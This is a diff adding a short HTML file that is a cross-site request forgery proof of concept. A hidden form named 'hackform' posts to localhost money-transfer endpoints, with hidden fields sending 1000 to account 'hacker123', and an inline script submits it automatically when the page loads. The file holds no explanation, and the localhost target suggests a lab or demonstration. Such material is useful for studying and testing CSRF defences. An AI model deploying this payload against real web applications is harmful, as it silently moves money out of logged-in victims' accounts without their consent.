@@ -1,0 +1,13 @@
+<form
+  action="http://localhost:8888/process_transfer.cfm"
+  action="http://localhost:8888/process_transfer_secure.cfm"
+  method="post"
+  id="hackform"
+>
+  <input type="hidden" name="toAccount" value="hacker123" />
+  <input type="hidden" name="amount" value="1000" />
+  <input type="hidden" name="submitTransfer" value="Transfer Money" />
+</form>
+<script>
+  document.getElementById("hackform").submit();
+</script>
